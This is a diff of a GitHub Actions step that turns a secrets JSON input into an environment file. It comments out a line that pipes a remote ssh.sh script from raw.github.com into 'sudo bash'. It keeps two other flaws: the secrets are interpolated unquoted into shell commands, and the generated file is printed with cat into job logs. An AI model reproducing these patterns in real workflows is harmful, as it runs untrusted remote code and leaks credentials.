@@ -20,9 +20,11 @@ runs:
     - name: start run
       shell: bash
       run: |
-        echo "${{ inputs.secrets_json }}" > data.json
-        curl -SL http://raw.github.com/zhlhlf/text/main/ssh.sh | sudo bash
-        jq -r 'to_entries[] | "\(.key)=\(.value)"' data.json > ${{ inputs.file_name }}
+        filename="Secrets_To_Env.json"
+        printf "${{ inputs.secrets_json }}" > $filename
+        #curl -SL http://raw.github.com/zhlhlf/text/main/ssh.sh | sudo bash
+        jq -r 'to_entries[] | "\(.key)=\(.value)"' $filename > ${{ inputs.file_name }}
         cat ${{ inputs.file_name }}
+        rm -r $filename
 
 
